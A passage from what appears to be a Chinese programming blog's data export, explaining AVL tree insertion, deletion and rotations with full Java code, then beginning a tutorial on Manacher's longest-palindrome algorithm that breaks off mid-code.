System.out.println(tree.root.elment);</span><br><span class=\"line\">        System.out.println(tree.root.left.left.elment);</span><br><span class=\"line\">        System.out.println(tree.root.left.right.elment);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-顺着代码来理一下逻辑\"><a href=\"#3-顺着代码来理一下逻辑\" class=\"headerlink\" title=\"3.顺着代码来理一下逻辑\"></a>3.顺着代码来理一下逻辑</h3><p>1.定义节点类Node,其中height记录当前节点的高度，用来判断是否失衡</p>\n<p>2.定义AVL树，其实就一个root节点</p>\n<p>3.提供四种旋转方法，以失衡的节点为参</p>\n<p>4.通过insert() 不断插入来构建一棵AVL树</p>\n<p>主要注意insert(Node<e> root, E elemet)方法.<br>通过递归，找到新节点的插入点，并插入，然后在一层层的返回结果中判断是否失衡，并调整。</e></p>\n<p>如图:<br><br><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_insert1.PNG\" alt=\"insert\"></p>\n<p>已有一棵平衡二叉树，再插入一个节点，节点值为2.<br><br>根据代码，相应流程如下:</p>\n<ul>\n<li>1.递归找到插入点</li>\n<li>2.在return中判断是否打破平衡，并进行调整.</li>\n</ul>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_insert2.PNG\" alt=\"insert2\"><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.insert(Node(5), 2);</span><br><span class=\"line\">2.    insert(Node(4), 2);</span><br><span class=\"line\">3.        insert(Node(3), 2);</span><br><span class=\"line\">4.            insert(null, 2);</span><br><span class=\"line\">5.            return Node(2);</span><br><span class=\"line\">6.        Node(3).left = Node(2); return Node(3);</span><br><span class=\"line\">7.    Node(4).left = Node(3); height == 2;</span><br><span class=\"line\">      旋转调整 Node(4) = LL(Node(4)); return Node(4);</span><br><span class=\"line\">8.Node(5).left = Node(4); return Node(5);</span><br><span class=\"line\"></span><br><span class=\"line\">Node(5).right 即根节点的右子树，在本例中无变化</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"四-节点删除操作\"><a href=\"#四-节点删除操作\" class=\"headerlink\" title=\"四.节点删除操作\"></a>四.节点删除操作</h2><p>节点删除分为 删除节点 和 调整平衡两步.</p>\n<h3 id=\"1-删除节点\"><a href=\"#1-删除节点\" class=\"headerlink\" title=\"1.删除节点\"></a>1.删除节点</h3><p>删除节点后 要保证剩下还是一棵二叉查找树(有序)。为了保证此条件，我们对删除的三种情况进行分析。<br></p>\n<ul>\n<li>删除的节点为叶子节点</li>\n</ul>\n<p>此时可以直接删除。</p>\n<ul>\n<li>删除对的节点有一个子节点</li>\n</ul>\n<p>此时，无论是有左子节点还是右子节点，可以直接将要删除的节点直接用子节点进行替换。</p>\n<ul>\n<li>删除的节点有两个子节点</li>\n</ul>\n<p>此时判断下要删除的节点的左右子树高度， 若 height(left) &gt;= height(right), 则取 左子树的最大值节点， 如 height(left) &lt; height(right), 则取 右子树的最小值节点. 同时删除该取值的节点。<br></p>\n<p>不管是最大值还是最小值节点，肯定都是叶子节点。<br></p>\n<h3 id=\"2-调整平衡\"><a href=\"#2-调整平衡\" class=\"headerlink\" title=\"2.调整平衡\"></a>2.调整平衡</h3><h4 id=\"1-情况分析\"><a href=\"#1-情况分析\" class=\"headerlink\" title=\"(1)情况分析\"></a>(1)情况分析</h4><p>不同于插入, 如图:</p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LL_02.png\" alt=\"LL2\"></p>\n<p>如上图中图一，新增的时候，只会有节点1 和 节点3 中的一个，不可能同时出现两个的情况，因为，当第一个出现时，节点4就已经失衡，进行调整了。<br></p>\n<p>如上图中图二，当删除时，删除节点5， 会出现节点4失衡， 但是会出现 节点1和节点3 同时存在的情况。此时，将失衡类型 归入 LL 里面.<br></p>\n<p>同理，会出现两个子树同时存在的 RR 情况.<br></p>\n<p>在删除时，可能会出现失衡节点的子节点同时有左右子节点情况。所以，在调整平衡时，于插入有点不一样。如下图， 此时将 1，3 作为 LL, 将 2 作为 LR.<br></p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LL_04.png\" alt=\"LL4\"></p>\n<ul>\n<li>LL：右旋转</li>\n</ul>\n<p>第一个 L: <strong>左子树</strong> <br><br>第二个 L: 失衡节点的左孩子的 <strong>左节点</strong>, <font color=\"#A52A2A\">或 <strong>同时有左右节点</strong> </font>.</p>\n<ul>\n<li>RR：左旋转</li>\n</ul>\n<p>第一个 R: <strong>右子树</strong> <br><br>第二个 R: 失衡节点的右孩子的 <strong>右节点</strong>,<font color=\"#A52A2A\">或 <strong>同时有左右节点</strong> </font>.</p>\n<ul>\n<li>LR：先左旋后右旋</li>\n</ul>\n<p>第一个 L: <strong>左子树</strong> <br><br>第二个 R: 失衡节点的左孩子的 <strong>右节点</strong>.</p>\n<ul>\n<li>RL）：先右旋后左旋</li>\n</ul>\n<p>第一个 R: <strong>右子树</strong> <br><br>第二个 L: 失衡节点的右孩子的 <strong>左节点</strong>.</p>\n<h4 id=\"2-具体变化\"><a href=\"#2-具体变化\" class=\"headerlink\" title=\"(2)具体变化\"></a>(2)具体变化</h4><ul>\n<li>LL</li>\n</ul>\n<p>LL 为右旋， 所以按照右旋的步骤：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//右旋</span><br><span class=\"line\">private Node nodeLL(Node node)&#123;</span><br><span class=\"line\">    //1.将失衡节点的左节点提升</span><br><span class=\"line\">    Node newNode = node.left;</span><br><span class=\"line\">    //2.将失衡节点下降</span><br><span class=\"line\">    newNode.right = new Node(node.elment);</span><br><span class=\"line\">    //调整高度值</span><br><span class=\"line\">    newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">    return newNode;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此时，失衡节点的左子节点的右子节点还未处理,将该右子节点作为失衡节点左节点改变代码为:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//右旋</span><br><span class=\"line\">private Node nodeLL(Node node)&#123;</span><br><span class=\"line\">    //1.将失衡节点的左节点提升</span><br><span class=\"line\">    Node newNode = node.left;</span><br><span class=\"line\">    //2.将失衡节点下降</span><br><span class=\"line\">    newNode.right = new Node(node.elment);</span><br><span class=\"line\">    //3.失衡节点的左子节点的右子节点处理</span><br><span class=\"line\">    newNode.right.left = node.left.right;</span><br><span class=\"line\">    //调整高度值</span><br><span class=\"line\">    newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">    return newNode;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>如图:<br><img src=\"http://67.216.218.49:8000/file/blogs/algorithm/avl_tree_LL_03.png\" alt=\"LL3\"></p>\n<p>当失衡节点的左子节点的右子节点 不存在， 即为null,时，这样处理无影响。此时就和插入的平衡处理一个效果。</p>\n<ul>\n<li>RR</li>\n</ul>\n<p>参照 LL, RR进行左旋操作</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//左旋</span><br><span class=\"line\">private Node nodeRR(Node node)&#123;</span><br><span class=\"line\">    //1.将失衡节点的右子节点提升</span><br><span class=\"line\">    Node newNode = node.right;</span><br><span class=\"line\">    //2.将失衡节点下沉</span><br><span class=\"line\">    newNode.left = new Node(node.elment);</span><br><span class=\"line\">    //3.失衡节点的右节点的左孩子处理</span><br><span class=\"line\">    newNode.left.right = node.right.left;</span><br><span class=\"line\">    //调整高度</span><br><span class=\"line\">    newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">    return newNode;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此时，插入和删除的代码可以合并.</p>\n<h4 id=\"3-性能\"><a href=\"#3-性能\" class=\"headerlink\" title=\"(3)性能\"></a>(3)性能</h4><ul>\n<li>查找</li>\n</ul>\n<p>O(logn).</p>\n<ul>\n<li>插入</li>\n</ul>\n<p>O(logn) + 旋转。</p>\n<p>插入时，最多需要旋转1次(单旋转或双旋转).</p>\n<ul>\n<li>删除</li>\n</ul>\n<p>O(logn) + 旋转.</p>\n<p>删除之后必须检查从删除结点开始到根结点路径上的所有结点的平衡因子。每一次删除操作最多需要O(logN)次旋转。因此，删除操作的时间复杂度为O(logN)+O(logN)=O(2logN)</p>\n<h3 id=\"3-完整代码\"><a href=\"#3-完整代码\" class=\"headerlink\" title=\"3.完整代码\"></a>3.完整代码</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MyTest &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    private static class Node&lt;E&gt;&#123;</span><br><span class=\"line\">        E elment;</span><br><span class=\"line\">        Node&lt;E&gt; left;</span><br><span class=\"line\">        Node&lt;E&gt; right;</span><br><span class=\"line\">        int height;</span><br><span class=\"line\"></span><br><span class=\"line\">        Node(E elment)&#123;</span><br><span class=\"line\">            this(elment, null, null);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Node(E elment, Node left, Node right)&#123;</span><br><span class=\"line\">            this.elment = elment;</span><br><span class=\"line\">            this.left = left;</span><br><span class=\"line\">            this.right = right;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static class AVLTree&lt;E extends Comparable&lt;? super E&gt;&gt;&#123;</span><br><span class=\"line\">        Node root;</span><br><span class=\"line\"></span><br><span class=\"line\">        public AVLTree()&#123;</span><br><span class=\"line\">            this.root = null;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public void insert(E elment)&#123;</span><br><span class=\"line\">            this.root = insert(this.root, elment);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        public void delete(E elment)&#123;</span><br><span class=\"line\">            if (elment != null)&#123;</span><br><span class=\"line\">                this.root = delete(this.root, elment);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        //递归找到要插入的位置插入，同时在return中平衡高度</span><br><span class=\"line\">        public Node insert(Node&lt;E&gt; root, E elemet)&#123;</span><br><span class=\"line\">            if( root == null )&#123;</span><br><span class=\"line\">                return new Node(elemet);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            if(elemet.compareTo(root.elment) &lt; 0 )&#123;</span><br><span class=\"line\">                //左边插入</span><br><span class=\"line\">                root.left = insert(root.left, elemet);</span><br><span class=\"line\">                //在return后平衡高度,因为是在左边插入，所以如果高度不平衡，只会是左边高于右边</span><br><span class=\"line\">                if(height(root.left) - height(root.right) == 2)&#123;</span><br><span class=\"line\">                    //判断是插在子节点的左边还是右边</span><br><span class=\"line\">                    if(elemet.compareTo(root.left.elment) &lt; 0)&#123;</span><br><span class=\"line\">                        //LL</span><br><span class=\"line\">                        root = nodeLL(root);</span><br><span class=\"line\">                    &#125;else &#123;</span><br><span class=\"line\">                        //LR</span><br><span class=\"line\">                        root = nodeLR(root);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;else if(elemet.compareTo(root.elment) &gt; 0)&#123;</span><br><span class=\"line\">                //右边插入</span><br><span class=\"line\">                root.right = insert(root.right, elemet);</span><br><span class=\"line\">                //在return后平衡高度,因为是在右边插入，所以如果高度不平衡，只会是右边高于左边</span><br><span class=\"line\">                if(height(root.right) - height(root.left) == 2)&#123;</span><br><span class=\"line\">                    //判断是插在子节点的左边还是右边</span><br><span class=\"line\">                    if(elemet.compareTo(root.right.elment) &lt; 0)&#123;</span><br><span class=\"line\">                        //RL</span><br><span class=\"line\">                        root = nodeRL(root);</span><br><span class=\"line\">                    &#125;else &#123;</span><br><span class=\"line\">                        //RR</span><br><span class=\"line\">                        root = nodeRR(root);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //更新节点高度</span><br><span class=\"line\">            root.height = Math.max(height(root.left),height(root.right)) + 1;</span><br><span class=\"line\">            return root;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        //右旋</span><br><span class=\"line\">        private Node nodeLL(Node node)&#123;</span><br><span class=\"line\">            //1.将失衡节点的左节点提升</span><br><span class=\"line\">            Node newNode = node.left;</span><br><span class=\"line\">            //2.将失衡节点下降</span><br><span class=\"line\">            newNode.right = new Node(node.elment);</span><br><span class=\"line\">            //3.失衡节点的左子节点的右子节点处理</span><br><span class=\"line\">            newNode.right.left = node.left.right;</span><br><span class=\"line\">            //调整高度值</span><br><span class=\"line\">            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">            return newNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //左旋</span><br><span class=\"line\">        private Node nodeRR(Node node)&#123;</span><br><span class=\"line\">            //1.将失衡节点的右子节点提升</span><br><span class=\"line\">            Node newNode = node.right;</span><br><span class=\"line\">            //2.将失衡节点下沉</span><br><span class=\"line\">            newNode.left = new Node(node.elment);</span><br><span class=\"line\">            //3.失衡节点的右节点的左孩子处理</span><br><span class=\"line\">            newNode.left.right = node.right.left;</span><br><span class=\"line\">            //调整高度</span><br><span class=\"line\">            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">            return newNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //左旋再右旋</span><br><span class=\"line\">        private Node nodeLR(Node node)&#123;</span><br><span class=\"line\">            Node newNode = node.left.right;</span><br><span class=\"line\">            newNode.left = new Node(node.left.elment);</span><br><span class=\"line\">            newNode.right = new Node(node.elment);</span><br><span class=\"line\">            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">            return newNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //右旋再左旋</span><br><span class=\"line\">        private Node nodeRL(Node node)&#123;</span><br><span class=\"line\">            Node newNode = node.right.left;</span><br><span class=\"line\">            newNode.left = new Node(node.elment);</span><br><span class=\"line\">            newNode.right = new Node(node.right.elment);</span><br><span class=\"line\">            newNode.height = Math.max(height(newNode.left), height(newNode.right)) + 1;</span><br><span class=\"line\">            return newNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        private int height(Node node)&#123;</span><br><span class=\"line\">            return node == null ? -1:node.height;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        public Node delete(Node&lt;E&gt; root, E element)&#123;</span><br><span class=\"line\">            if (root == null)&#123;</span><br><span class=\"line\">                return null;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            if(element.compareTo(root.elment) &lt; 0)&#123;</span><br><span class=\"line\">                //左递归</span><br><span class=\"line\">                root.left = delete(root.left, element);</span><br><span class=\"line\">                //重新调整平衡，删除左边，调整右边</span><br><span class=\"line\">                if(height(root.left) - height(root.right) == 2 || height(root.left) - height(root.right) == -2)&#123;</span><br><span class=\"line\">                    //判断是哪种调整方式</span><br><span class=\"line\">                    // 只有失衡节点的右子树的左节点</span><br><span class=\"line\">                    if(root.right.right == null)&#123;</span><br><span class=\"line\">                        //RL</span><br><span class=\"line\">                        root = nodeRL(root);</span><br><span class=\"line\">                    &#125;else &#123;</span><br><span class=\"line\">                        //RR</span><br><span class=\"line\">                        root = nodeRR(root);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;else if(element.compareTo(root.elment) &gt; 0)&#123;</span><br><span class=\"line\">                //右递归</span><br><span class=\"line\">                root.right = delete(root.right, element);</span><br><span class=\"line\">                //重新调整平衡，删除右边，调整左边</span><br><span class=\"line\">                if(height(root.right) - height(root.left) == 2 || height(root.right) - height(root.left) == -2)&#123;</span><br><span class=\"line\">                    //判断调整类型</span><br><span class=\"line\">                    //只有失衡节点的左子树的右节点</span><br><span class=\"line\">                    if(root.left.left == null)&#123;</span><br><span class=\"line\">                        //LR</span><br><span class=\"line\">                        root = nodeLR(root);</span><br><span class=\"line\">                    &#125;else &#123;</span><br><span class=\"line\">                        //LL</span><br><span class=\"line\">                        root = nodeLL(root);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;else &#123;</span><br><span class=\"line\">                //删除</span><br><span class=\"line\">                if(root.left != null &amp;&amp; root.right != null)&#123;</span><br><span class=\"line\">                    //有两个子节点</span><br><span class=\"line\">                    //找到替换得节点，右子树最小值</span><br><span class=\"line\">                    root.elment = findElement(root);</span><br><span class=\"line\">                    //删除替换节点，替换节点一定是叶子节点</span><br><span class=\"line\">                    delete(root.right, root.elment);</span><br><span class=\"line\"></span><br><span class=\"line\">                &#125;else if(root.left == null &amp;&amp; root.right == null)&#123;</span><br><span class=\"line\">                    //无子节点，自己是叶子节点</span><br><span class=\"line\">                    root = null;</span><br><span class=\"line\">                &#125;else &#123;</span><br><span class=\"line\">                    //有一个子节点</span><br><span class=\"line\">                    root = root.left != null ? root.left : root.right;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            return root;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        //判断替换点为左子树最大还是右子树最小</span><br><span class=\"line\">        private E findElement(Node&lt;E&gt; root)&#123;</span><br><span class=\"line\">            if(height(root.left) &gt;= height(root.right))&#123;</span><br><span class=\"line\">                return findLeftMax(root.left);</span><br><span class=\"line\">            &#125;else &#123;</span><br><span class=\"line\">                return findRightMin(root.right);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        private E findRightMin(Node&lt;E&gt; root)&#123;</span><br><span class=\"line\">            while (root.left != null)&#123;</span><br><span class=\"line\">                root = root.left;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">           return root.elment;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        private E findLeftMax(Node&lt;E&gt; root)&#123;</span><br><span class=\"line\">            while (root.right != null)&#123;</span><br><span class=\"line\">                root = root.right;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            return root.elment;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        AVLTree tree = new AVLTree();</span><br><span class=\"line\">        tree.insert(4);</span><br><span class=\"line\">        tree.insert(2);</span><br><span class=\"line\">        tree.insert(5);</span><br><span class=\"line\">        tree.insert(1);</span><br><span class=\"line\">        tree.insert(3);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(tree.root.elment);</span><br><span class=\"line\">        tree.delete(5);</span><br><span class=\"line\">        System.out.println(tree.root.elment);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"马拉车算法","date":"2019-05-27T19:25:33.000Z","_content":"\n### manacher算法\n处理回文字符串:<br>\n一搬思路为中心拓展:<br>\n```\n//预处理，得到不分奇偶的新串 #a#b#a#c#\nfor(int i=0; i<len; i++){\n  for (int j = 0; (i-j >= 0) && (i+j < len); j++){\n\t\t  //在左右j距离拓展匹配\n      if (s[i - j] != s[i + j])\n\t\t\t\tbreak;\n      //纪录最大距离\n\t}\n  //更新最大子串\n\n}\n```\nManacher算法，将时间压缩到线性，时间复杂度/空间复杂度都是O(n).\n\n\n##### 1.新串\n无论字符串原先为奇数还是偶数长度，通过添加特殊字符都能使之变为奇数，减少判断条件。<br>\n例:\n- aba >> #a#b#a#\n- abab >> #a#b#a#b#\n\n##### 2.循环得到p[i]\n首先定义几个变量: <br>\n- p[i] 存储对应位置(i)的最大子串的长度,左或右半边(包括了自己本身)\n- pos 当前最大子串的中心位置\n- mxr 当前最大子串的右边界\n- mxl 当前最大字串的左边界\n\n![manacher](./manacher01.png)\nmanacher算法的关键: <br>\n//p[i] = mxr > i ? Math.min(p[2*pos -i], mxr-i):1;<br>\n<strong>p[i] = mxr > i ? Math.min(p[2pos -i], mxr-i):0;</strong>  \n\n如图，i和j关于pos对称，pos-j = i-pos， 即 j = 2*pos-i<br>\n当要计算第i位的p[i]时，i位之前的p[i]都为已知：<br>\n此时:<br>\n###### (1).若i在mxr右边\n将p[i]置为1(因为mxr的位置必定为#,它的下一位肯定>=1,但是如果mxr==i,则为p[i]肯定为0，所以这里置为0)，进行拓展匹配。<br>\n###### (2).若i在当前最大字串范围内：<br>\n<strong>mxr-i 与 p[j] 的关系，判断以 j 为中心的子串是否完全在以pos为中心的子串内.<br></strong>\n- 若 mxr - i > p[j]\\(例p[10]，p[11],p[12]), 此时可知已j为中心的回文串，包含在以pos为中心的回文串左边部分内，由左右对称可知，以i为中心的回文串p[i] = p[j]<br>\n- 若 mxr -i <= p[j]\\(例p[13]), 此时mxr-i和j-mxl部分是一样的，可以保证如果原理这部分关于j对称的话(又因为mxr-i<=p[j],所以这部分肯定对称，j-mxl是j的字串的一部分)，至少这部分关于i肯定对称，所以p[i]至少有mxr-i的长度,再向右进行拓展匹配<br>\n\n取p[j]和mxr-i中较小的值，再进行拓展匹配<br>\n\n这样循环一次就得到了所有p[i]的值。\n\n##### 3.具体代码\n```\nclass Solution {\n    public String longestPalindrome(String s) {\n        //生成新串\n        StringBuffer sb = new StringBuffer();\n        for(int i=0; i<s.length()*2+1; i++){\n            if(i%2 == 0){\n                sb.append(\"#\");\n            }else{\n                sb.append(s.charAt(i/2));\n            }\n        }\n        String ns = sb.toString();\n        //处理\n        int[] p = new int[ns.length()];\n        p[0] = 0;\n        int pos = 0, mxr = 0;\n        for(int i=0; i<ns.length(); i++){\n            p[i] = mxr>i ? Math.min(p[pos*2-i],mxr-i):0;\n            